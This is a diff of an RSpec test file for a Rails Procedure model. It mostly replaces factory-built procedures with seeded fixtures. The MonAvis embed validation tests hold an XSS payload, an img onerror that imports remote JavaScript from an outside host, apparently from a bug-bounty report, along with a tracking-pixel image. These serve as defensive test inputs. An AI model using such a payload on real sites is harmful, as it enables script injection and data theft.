@@ -3,7 +3,7 @@
 describe Procedure do
   [:lien_notice, :lien_dpo, :web_hook_url].each do |field|
     describe "#{field} validation" do
-        let(:procedure) { build(:procedure) }
+        let(:procedure) { procedures.brouillon }
 
         it 'accepts a valid https URL' do
           procedure.send("#{field}=".to_sym, 'https://example.com/')
@@ -59,7 +59,7 @@ describe Procedure do
   end
 
   describe 'mail templates' do
-    subject { create(:procedure) }
+    subject { procedures.brouillon }
 
     it "returns expected classes" do
       expect(subject.passer_en_construction_email_template).to be_a(Mails::InitiatedMail)
@@ -86,7 +86,7 @@ describe Procedure do
   end
 
   describe 'initiated_mail' do
-    let(:procedure) { create(:procedure) }
+    let(:procedure) { procedures.brouillon }
 
     subject { procedure }
 
@@ -111,13 +111,13 @@ describe Procedure do
       end
       it do
         expect(subject.passer_en_construction_email_template.body).to eq('toto')
-        expect(Mails::InitiatedMail.count).to eq(1)
+        expect(Mails::InitiatedMail.where(procedure:).count).to eq(1)
       end
     end
   end
 
   describe 'closed mail template body' do
-    let(:procedure) { create(:procedure, attestation_acceptation_template: attestation_template) }
+    let(:procedure) { procedures.brouillon.tap { it.update!(attestation_acceptation_template: attestation_template) } }
     let(:attestation_template) { nil }
 
     subject { procedure.accepter_email_template.body }
@@ -144,7 +144,7 @@ describe Procedure do
   end
 
   describe 'refused mail template body' do
-    let(:procedure) { create(:procedure, attestation_refus_template: attestation_template) }
+    let(:procedure) { procedures.brouillon.tap { it.update!(attestation_refus_template: attestation_template) } }
     let(:attestation_template) { nil }
 
     subject { procedure.refuser_email_template.body }
@@ -171,12 +171,12 @@ describe Procedure do
   end
 
   describe '#mail_template_attestation_inconsistency_state with closed_mail' do
-    let(:procedure_without_attestation) { create(:procedure, closed_mail: closed_mail, attestation_acceptation_template: nil) }
+    let(:procedure_without_attestation) { procedures.brouillon.tap { it.update!(closed_mail: closed_mail, attestation_acceptation_template: nil) } }
     let(:procedure_with_active_attestation) do
-      create(:procedure, closed_mail: closed_mail, attestation_acceptation_template: build(:attestation_template, activated: true))
+      procedures.brouillon.tap { it.update!(closed_mail: closed_mail, attestation_acceptation_template: build(:attestation_template, activated: true)) }
     end
     let(:procedure_with_inactive_attestation) do
-      create(:procedure, closed_mail: closed_mail, attestation_acceptation_template: build(:attestation_template, activated: false))
+      procedures.brouillon.tap { it.update!(closed_mail: closed_mail, attestation_acceptation_template: build(:attestation_template, activated: false)) }
     end
 
     subject { procedure.mail_template_attestation_inconsistency_state(:acceptation) }
@@ -232,12 +232,12 @@ describe Procedure do
   end
 
   describe '#mail_template_attestation_inconsistency_state with refused_mail' do
-    let(:procedure_without_attestation) { create(:procedure, refused_mail: refused_mail, attestation_refus_template: nil) }
+    let(:procedure_without_attestation) { procedures.brouillon.tap { it.update!(refused_mail: refused_mail, attestation_refus_template: nil) } }
     let(:procedure_with_active_attestation) do
-      create(:procedure, refused_mail: refused_mail, attestation_refus_template: build(:attestation_template, activated: true, kind: 'refus'))
+      procedures.brouillon.tap { it.update!(refused_mail: refused_mail, attestation_refus_template: build(:attestation_template, activated: true, kind: 'refus')) }
     end
     let(:procedure_with_inactive_attestation) do
-      create(:procedure, refused_mail: refused_mail, attestation_refus_template: build(:attestation_template, activated: false, kind: 'refus'))
+      procedures.brouillon.tap { it.update!(refused_mail: refused_mail, attestation_refus_template: build(:attestation_template, activated: false, kind: 'refus')) }
     end
 
     subject { procedure.mail_template_attestation_inconsistency_state(:refus) }
@@ -293,7 +293,7 @@ describe Procedure do
   end
 
   describe 'scopes' do
-    let!(:procedure) { create(:procedure) }
+    let!(:procedure) { procedures.individual }
     let!(:discarded_procedure) { create(:procedure, :discarded) }
 
     describe 'default_scope' do
@@ -316,7 +316,7 @@ describe Procedure do
 
     context 'closing procedure' do
       context 'without replacing procedure in DS' do
-        let(:procedure) { create(:procedure) }
+        let(:procedure) { procedures.brouillon }
 
         context 'valid' do
           before do
@@ -345,7 +345,7 @@ describe Procedure do
     end
 
     context 'before_remove callback for minimal administrator presence' do
-      let(:procedure) { create(:procedure) }
+      let(:procedure) { procedures.brouillon }
 
       it 'raises an error when trying to remove the last administrateur' do
         expect(procedure.administrateurs.count).to eq(1)
@@ -365,7 +365,7 @@ describe Procedure do
       end
 
       context 'with deliberation' do
-        let(:procedure) { build(:procedure, cadre_juridique: nil, revisions: [build(:procedure_revision)]) }
+        let(:procedure) { procedures.brouillon.tap { it.cadre_juridique = nil } }
 
         it { expect(procedure.valid?(:publication)).to eq(false) }
 
@@ -387,7 +387,7 @@ describe Procedure do
       end
 
       context 'when juridique_required is false' do
-        let(:procedure) { build(:procedure, juridique_required: false, cadre_juridique: nil) }
+        let(:procedure) { procedures.brouillon.tap { it.assign_attributes(juridique_required: false, cadre_juridique: nil) } }
 
         it { expect(procedure.valid?(:publication)).to eq(true) }
       end
@@ -406,12 +406,12 @@ describe Procedure do
       subject { procedure.tap { it.validate(:publication) }.errors.full_messages }
 
       context 'random string is not allowed' do
-        let(:procedure) { build(:procedure, monavis_embed: "plop") }
+        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = "plop" } }
         it { is_expected.to eq(["Le code MonAvis doit comporter un lien", "Le code MonAvis doit comporter une image"]) }
       end
 
       context 'random html is not allowed' do
-        let(:procedure) { build(:procedure, monavis_embed: '<img src="http://some.analytics/hello.gif">') }
+        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = '<img src="http://some.analytics/hello.gif">' } }
         it { is_expected.to include("Le code MonAvis contient une image pointont vers un domaine invalide") }
       end
 
@@ -421,7 +421,7 @@ describe Procedure do
           <img src="https://jedonnemonavis.numerique.gouv.fr/monavis-static/bouton-blanc.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
         </a>
         MSG
-        let(:procedure) { build(:procedure, monavis_embed: monavis_blanc) }
+        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_blanc } }
         it { is_expected.to eq([]) }
       end
 
@@ -431,7 +431,7 @@ describe Procedure do
           <img src="https://jedonnemonavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
         </a>
         MSG
-        let(:procedure) { build(:procedure, monavis_embed: monavis_bleu) }
+        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_bleu } }
         it { is_expected.to eq([]) }
       end
 
@@ -441,7 +441,7 @@ describe Procedure do
           <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
         </a>
         MSG
-        let(:procedure) { build(:procedure, monavis_embed: monavis_old) }
+        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_old } }
         it { is_expected.to eq([]) }
       end
 
@@ -451,7 +451,7 @@ describe Procedure do
           <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="Je donne mon avis" title="Je donne mon avis sur cette démarche" />
         </a>
         MSG
-        let(:procedure) { build(:procedure, monavis_embed: monavis_issue_phillipe) }
+        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_issue_phillipe } }
         it { is_expected.to eq([]) }
       end
 
@@ -461,7 +461,7 @@ describe Procedure do
             <img src="https://voxusagers.numerique.gouv.fr/static/bouton-bleu.svg" alt="Je donne mon avis" />
           </a>
         MSG
-        let(:procedure) { build(:procedure, monavis_embed: monavis_issue_bouchra) }
+        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_issue_bouchra } }
         it { is_expected.to eq([]) }
       end
 
@@ -471,7 +471,7 @@ describe Procedure do
             <img src="https://jedonnemonavis.numerique.gouv.fr/static/bouton-bleu.svg" alt="Je donne mon avis" />
           </a>
         MSG
-        let(:procedure) { build(:procedure, monavis_embed: monavis_jedonnemonavis) }
+        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_jedonnemonavis } }
         it { is_expected.to eq([]) }
       end
 
@@ -481,7 +481,7 @@ describe Procedure do
             <img src="https://kthxbye.fr/static/bouton-bleu.svg" alt="Je donne mon avis" />
           </a>
         MSG
-        let(:procedure) { build(:procedure, monavis_embed: monavis_jedonnemonavis) }
+        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_jedonnemonavis } }
         it { is_expected.to include("Le code MonAvis contient un lien pointant vers un domaine invalide") }
       end
 
@@ -491,7 +491,7 @@ describe Procedure do
             <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.png" alt="avis" />
           </a>
         MSG
-        let(:procedure) { build(:procedure, monavis_embed: malicious_embed) }
+        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = malicious_embed } }
         it { is_expected.to be_present }
       end
 
@@ -500,7 +500,7 @@ describe Procedure do
          <a href="https://monavis.numerique.gouv.fr/Demarches/123456?&view-mode=formulaire-avis&nd_mode=en-ligne-enti%C3%A8rement&nd_source=button&key=cd4a872d4"></a>
          <img src="https://monavis.numerique.gouv.fr/monavis-static/bouton-bleu.pngx" alt="x" onerror=import('https://hks.ec/ATOXSS-ze4fzfze54.js') />
         MSG
-        let(:procedure) { build(:procedure, monavis_embed: monavis_ywh_pgm5381_46) }
+        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_ywh_pgm5381_46 } }
         it { is_expected.to eq(["Le code MonAvis contient un attribut interdit : onerror"]) }
       end
 
@@ -513,7 +513,7 @@ describe Procedure do
           </a>
         MSG
 
-       let(:procedure) { build(:procedure, monavis_embed: monavis_blanc) }
+       let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_blanc } }
        it { is_expected.to eq([]) }
      end
 
@@ -526,7 +526,7 @@ describe Procedure do
         </a>
         MSG
 
-        let(:procedure) { build(:procedure, monavis_embed: monavis_blanc) }
+        let(:procedure) { procedures.brouillon.tap { it.monavis_embed = monavis_blanc } }
         it { is_expected.to eq([]) }
       end
     end
@@ -857,7 +857,7 @@ describe Procedure do
       end
 
       context 'when procedure is published without sva' do
-        let(:procedure) { create(:procedure, :published) }
+        let(:procedure) { procedures.individual }
 
         it 'allow activation' do
           expect(procedure).to be_valid
@@ -893,7 +893,7 @@ describe Procedure do
   end
 
   describe 'opendata' do
-    let(:procedure) { create(:procedure) }
+    let(:procedure) { procedures.brouillon }
 
     it 'is true by default' do
       expect(procedure.opendata).to be_truthy
@@ -934,7 +934,7 @@ describe Procedure do
   end
 
   describe 'active' do
-    let(:procedure) { create(:procedure) }
+    let(:procedure) { procedures.brouillon }
     subject { Procedure.active(procedure.id) }
 
     context 'when procedure is in draft status and not closed' do
@@ -942,7 +942,7 @@ describe Procedure do
     end
 
     context 'when procedure is published and not closed' do
-      let(:procedure) { create(:procedure, :published) }
+      let(:procedure) { procedures.individual }
       it { is_expected.to be_truthy }
     end
 
@@ -953,7 +953,7 @@ describe Procedure do
   end
 
   describe '#publish!' do
-    let(:procedure) { create(:procedure, path: 'example-path', zones: [create(:zone)]) }
+    let(:procedure) { create(:procedure, path: 'example-path', zones: [zones.default]) }
     let(:now) { Time.zone.now.beginning_of_minute }
 
     context 'when publishing a new procedure' do
@@ -983,7 +983,7 @@ describe Procedure do
     end
 
     context 'when publishing over a previous canonical procedure' do
-      let(:canonical_procedure) { create(:procedure, :published) }
+      let(:canonical_procedure) { procedures.individual }
 
       before do
         travel_to(now) do
@@ -1003,10 +1003,10 @@ describe Procedure do
   end
 
   describe "#publish_or_reopen!" do
-    let(:canonical_procedure) { create(:procedure, :published) }
+    let(:canonical_procedure) { procedures.individual }
     let(:administrateur) { canonical_procedure.administrateurs.first }
 
-    let(:procedure) { create(:procedure, administrateurs: [administrateur], zones: [create(:zone)]) }
+    let(:procedure) { create(:procedure, administrateurs: [administrateur], zones: [zones.default]) }
     let(:now) { Time.zone.now.beginning_of_minute }
 
     context 'when publishing over a previous canonical procedure' do
@@ -1071,7 +1071,7 @@ describe Procedure do
     end
 
     context 'when republishing a previously closed procedure' do
-      let(:procedure) { create(:procedure, :published, administrateurs: [administrateur]) }
+      let(:procedure) { procedures.individual }
 
       before do
         procedure.close!
@@ -1174,7 +1174,7 @@ describe Procedure do
   end
 
   describe "#reset_draft_revision!" do
-    let(:procedure) { create(:procedure) }
+    let(:procedure) { procedures.brouillon }
     let(:tdc_attributes) { { type_champ: :number, libelle: 'libelle 1' } }
     let(:publication_date) { Time.zone.local(2021, 1, 1, 12, 00, 00) }
 
@@ -1227,7 +1227,7 @@ describe Procedure do
   end
 
   describe "#unpublish!" do
-    let(:procedure) { create(:procedure, :published) }
+    let(:procedure) { procedures.individual }
     let(:now) { Time.zone.now.beginning_of_minute }
 
     before do
@@ -1251,8 +1251,8 @@ describe Procedure do
   end
 
   describe "#brouillon?" do
-    let(:procedure_brouillon) { build(:procedure) }
-    let(:procedure_publiee) { build(:procedure, :published) }
+    let(:procedure_brouillon) { procedures.brouillon }
+    let(:procedure_publiee) { procedures.individual }
     let(:procedure_close) { build(:procedure, :closed) }
     let(:procedure_depubliee) { build(:procedure, :unpublished) }
 
@@ -1265,8 +1265,8 @@ describe Procedure do
   end
 
   describe "#publiee?" do
-    let(:procedure_brouillon) { build(:procedure) }
-    let(:procedure_publiee) { build(:procedure, :published) }
+    let(:procedure_brouillon) { procedures.brouillon }
+    let(:procedure_publiee) { procedures.individual }
     let(:procedure_close) { build(:procedure, :closed) }
     let(:procedure_depubliee) { build(:procedure, :unpublished) }
 
@@ -1279,8 +1279,8 @@ describe Procedure do
   end
 
   describe "#close?" do
-    let(:procedure_brouillon) { build(:procedure) }
-    let(:procedure_publiee) { build(:procedure, :published) }
+    let(:procedure_brouillon) { procedures.brouillon }
+    let(:procedure_publiee) { procedures.individual }
     let(:procedure_close) { build(:procedure, :closed) }
     let(:procedure_depubliee) { build(:procedure, :unpublished) }
 
@@ -1293,8 +1293,8 @@ describe Procedure do
   end
 
   describe "#depubliee?" do
-    let(:procedure_brouillon) { build(:procedure) }
-    let(:procedure_publiee) { build(:procedure, :published) }
+    let(:procedure_brouillon) { procedures.brouillon }
+    let(:procedure_publiee) { procedures.individual }
     let(:procedure_close) { build(:procedure, :closed) }
     let(:procedure_depubliee) { build(:procedure, :unpublished) }
 
@@ -1307,8 +1307,8 @@ describe Procedure do
   end
 
   describe "#locked?" do
-    let(:procedure_brouillon) { build(:procedure) }
-    let(:procedure_publiee) { build(:procedure, :published) }
+    let(:procedure_brouillon) { procedures.brouillon }
+    let(:procedure_publiee) { procedures.individual }
     let(:procedure_close) { build(:procedure, :closed) }
     let(:procedure_depubliee) { build(:procedure, :unpublished) }
 
@@ -1321,7 +1321,7 @@ describe Procedure do
   end
 
   describe 'close' do
-    let(:procedure) { create(:procedure, :published) }
+    let(:procedure) { procedures.individual }
     let(:now) { Time.zone.now.beginning_of_minute }
     before do
       travel_to(now) do
@@ -1344,21 +1344,16 @@ describe Procedure do
   end
 
   describe 'total_dossier' do
-    let(:procedure) { create :procedure }
-
-    before do
-      create :dossier, procedure: procedure, state: Dossier.states.fetch(:en_construction)
-      create :dossier, procedure: procedure, state: Dossier.states.fetch(:brouillon)
-      create :dossier, procedure: procedure, state: Dossier.states.fetch(:en_construction)
-    end
+    let(:procedure) { procedures.individual }
 
     subject { procedure.total_dossier }
 
-    it { is_expected.to eq 2 }
+    # the seeded procedure has one dossier per state; only the brouillon is excluded
+    it { is_expected.to eq(procedure.dossiers.count - 1) }
   end
 
   describe 'suggested_path' do
-    let!(:procedure) { create(:procedure, aasm_state: :publiee, libelle: 'Inscription au Collège', zones: [create(:zone)]) }
+    let!(:procedure) { create(:procedure, aasm_state: :publiee, libelle: 'Inscription au Collège', zones: [zones.default]) }
     let(:path) { nil }
 
     before do
@@ -1380,7 +1375,7 @@ describe Procedure do
 
     context 'when the suggestion conflicts with one procedure' do
       before do
-        create(:procedure, aasm_state: :publiee, path: 'inscription-au-college', zones: [create(:zone)])
+        create(:procedure, aasm_state: :publiee, path: 'inscription-au-college', zones: [zones.default])
       end
 
       it { is_expected.to eq 'inscription-au-college-2' }
@@ -1388,8 +1383,8 @@ describe Procedure do
 
     context 'when the suggestion conflicts with several procedures' do
       before do
-        create(:procedure, aasm_state: :publiee, path: 'inscription-au-college', zones: [create(:zone)])
-        create(:procedure, aasm_state: :publiee, path: 'inscription-au-college-2', zones: [create(:zone)])
+        create(:procedure, aasm_state: :publiee, path: 'inscription-au-college', zones: [zones.default])
+        create(:procedure, aasm_state: :publiee, path: 'inscription-au-college-2', zones: [zones.default])
       end
 
       it { is_expected.to eq 'inscription-au-college-3' }
@@ -1397,7 +1392,7 @@ describe Procedure do
 
     context 'when the suggestion conflicts with another procedure of the same admin' do
       before do
-        create(:procedure, aasm_state: :publiee, path: 'inscription-au-college', administrateurs: procedure.administrateurs, zones: [create(:zone)])
+        create(:procedure, aasm_state: :publiee, path: 'inscription-au-college', administrateurs: procedure.administrateurs, zones: [zones.default])
       end
 
       it { is_expected.to eq 'inscription-au-college-2' }
@@ -1431,7 +1426,7 @@ describe Procedure do
     subject { procedure.discard_and_keep_track!(super_admin) }
 
     context "when discarding a procedure in brouillon" do
-      let(:procedure) { create(:procedure) }
+      let(:procedure) { procedures.brouillon }
       let!(:dossier) { create(:dossier, procedure:) }
 
       it 'destroys dossiers' do
@@ -1476,12 +1471,12 @@ describe Procedure do
   describe "#organisation_name" do
     subject { procedure.organisation_name }
     context 'when the procedure has a service (and no organization)' do
-      let(:procedure) { create(:procedure, :with_service, organisation: nil) }
+      let(:procedure) { procedures.brouillon }
       it { is_expected.to eq procedure.service.nom }
     end
 
     context 'when the procedure has an organization (and no service)' do
-      let(:procedure) { create(:procedure, organisation: 'DDT des Vosges', service: nil) }
+      let(:procedure) { procedures.brouillon.tap { it.update!(organisation: 'DDT des Vosges', service: nil) } }
       it { is_expected.to eq procedure.organisation }
     end
   end
@@ -1524,32 +1519,28 @@ describe Procedure do
   end
 
   describe '.missing_instructeurs?' do
-    let!(:procedure) { create(:procedure) }
+    let!(:procedure) { procedures.brouillon }
 
     subject { procedure.missing_instructeurs? }
 
     it { is_expected.to be true }
 
     context 'when an instructeur is assign to this procedure' do
-      let!(:instructeur) { create(:instructeur) }
-
-      before { instructeur.assign_to_procedure(procedure) }
+      before { instructeurs.default.assign_to_procedure(procedure) }
 
       it { is_expected.to be false }
     end
   end
 
   describe '.missing_zones?' do
-    let(:procedure) { create(:procedure, zones: []) }
+    let(:procedure) { procedures.brouillon }
 
     subject { procedure.missing_zones? }
 
     it { is_expected.to be true }
 
     context 'when a procedure has zones' do
-      let(:zone) { create(:zone) }
-
-      before { procedure.zones << zone }
+      before { procedure.zones << zones.default }
 
       it { is_expected.to be false }
     end
@@ -1559,13 +1550,13 @@ describe Procedure do
     subject { procedure.missing_steps.include?(step) }
 
     context 'without zone' do
-      let(:procedure) { create(:procedure, zones: []) }
+      let(:procedure) { procedures.brouillon }
       let(:step) { :zones }
       it { is_expected.to be_truthy }
     end
 
     context 'with zone' do
-      let(:procedure) { create(:procedure, zones: [create(:zone)]) }
+      let(:procedure) { procedures.individual }
       let(:step) { :zones }
       it { is_expected.to be_falsey }
     end
@@ -1612,11 +1603,16 @@ describe Procedure do
   end
 
   describe 'lien_dpo' do
+    let(:procedure) { procedures.brouillon }
+
     it do
-      expect(build(:procedure).valid?).to be(true)
-      expect(build(:procedure, lien_dpo: 'dpo@ministere.amere').valid?).to be(true)
-      expect(build(:procedure, lien_dpo: 'https://legal.fr/contact_dpo').valid?).to be(true)
-      expect(build(:procedure, lien_dpo: 'askjdlad l akdj asd ').valid?).to be(false)
+      expect(procedure.valid?).to be(true)
+      procedure.lien_dpo = 'dpo@ministere.amere'
+      expect(procedure.valid?).to be(true)
+      procedure.lien_dpo = 'https://legal.fr/contact_dpo'
+      expect(procedure.valid?).to be(true)
+      procedure.lien_dpo = 'askjdlad l akdj asd '
+      expect(procedure.valid?).to be(false)
     end
   end
 
@@ -1730,7 +1726,7 @@ describe Procedure do
   end
 
   describe 'lien_notice' do
-    let(:procedure) { build(:procedure, lien_notice:) }
+    let(:procedure) { procedures.brouillon.tap { it.lien_notice = lien_notice } }
 
     context 'when empty' do
       let(:lien_notice) { '' }
@@ -1759,7 +1755,7 @@ describe Procedure do
   end
 
   describe 'lien_dpo' do
-    let(:procedure) { build(:procedure, lien_dpo:) }
+    let(:procedure) { procedures.brouillon.tap { it.lien_dpo = lien_dpo } }
 
     context 'when empty' do
       let(:lien_dpo) { '' }
@@ -1828,7 +1824,7 @@ describe Procedure do
   end
 
   describe "#attestation_template" do
-    let(:procedure) { create(:procedure) }
+    let(:procedure) { procedures.brouillon }
     subject { procedure.reload }
 
     context "when there is a v2 draft and a v1" do
@@ -1874,8 +1870,8 @@ describe Procedure do
   end
 
   describe "#parsed_latest_zone_labels" do
-    let!(:draft_procedure) { create(:procedure) }
-    let!(:published_procedure) { create(:procedure_with_dossiers, :published, dossiers_count: 2) }
+    let!(:draft_procedure) { procedures.brouillon }
+    let!(:published_procedure) { procedures.individual }
     let!(:closed_procedure) { create(:procedure, :closed) }
     let!(:procedure_detail_draft) { ProcedureDetail.new(id: draft_procedure.id, latest_zone_labels: '{ "zone1", "zone2" }') }
     let!(:procedure_detail_published) { ProcedureDetail.new(id: published_procedure.id, latest_zone_labels: '{ "zone3", "zone4" }') }
@@ -1948,7 +1944,7 @@ describe Procedure do
   end
 
   describe '#update_labels_position' do
-    let(:procedure) { create(:procedure) }
+    let(:procedure) { procedures.brouillon }
     let!(:labels) { create_list(:label, 5, procedure_id: procedure.id) }
 
     it 'updates the positions of the specified instructeurs_procedures' do
@@ -1966,7 +1962,7 @@ describe Procedure do
 
   describe 'enable_pro_connect_for_moral_procedure callback' do
     context 'when creating a procedure for moral persons' do
-      let(:procedure) { create(:procedure, for_individual: false) }
+      let(:procedure) { procedures.entreprise }
 
       it 'enables pro_connect_for_moral_procedure' do
         expect(procedure.pro_connect_for_moral_procedure).to be true
@@ -1974,7 +1970,7 @@ describe Procedure do
     end
 
     context 'when creating a procedure for individuals' do
-      let(:procedure) { create(:procedure, for_individual: true) }
+      let(:procedure) { procedures.individual }
 
       it 'does not enable pro_connect_for_moral_procedure' do
         expect(procedure.pro_connect_for_moral_procedure).to be false
@@ -1982,7 +1978,7 @@ describe Procedure do
     end
 
     context 'when updating an existing moral procedure with the flag disabled' do
-      let(:procedure) { create(:procedure, for_individual: false) }
+      let(:procedure) { procedures.entreprise }
 
       before do
         procedure.update_column(:pro_connect_for_moral_procedure, false)
@@ -1996,7 +1992,7 @@ describe Procedure do
   end
 
   describe '#enable_pro_connect_restriction!' do
-    let(:procedure) { create(:procedure, opendata: true, robots_indexable: true) }
+    let(:procedure) { procedures.brouillon }
 
     context 'when setting to :none' do
       it 'updates restriction level without changing opendata/robots_indexable' do
